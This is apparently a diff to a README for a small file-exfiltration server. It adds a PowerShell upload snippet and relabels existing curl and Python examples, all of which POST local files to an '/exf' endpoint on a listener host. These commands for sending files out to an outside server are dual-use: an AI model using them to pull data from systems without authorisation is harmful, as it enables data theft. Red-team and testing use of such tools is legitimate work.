@@ -11,13 +11,24 @@ python3 server.py -p 80 -f /tmp/files
 
 ### Upload from sender:
 
-> By Curl:
+> Via curl:
 
 ```sh
 curl -X POST -F "file=@./file" http://<youhostname>:80/exf
 ```
 
-> By python:
+> Via powershell
+
+```powershell
+
+$FilePath = "C:\Users\Public\teste.txt"
+$Url = "http://127.0.0.1:80/exf"
+
+Invoke-WebRequest -Uri $Url -Method Post -InFile $FilePath -ContentType "multipart/form-data"
+
+```
+
+> Via python:
 ```py
 import requests
 import sys
@@ -42,4 +53,5 @@ if __name__ == "__main__":
     file_path = sys.argv[2]
     upload_file(server_url, file_path)
 ```
+
 
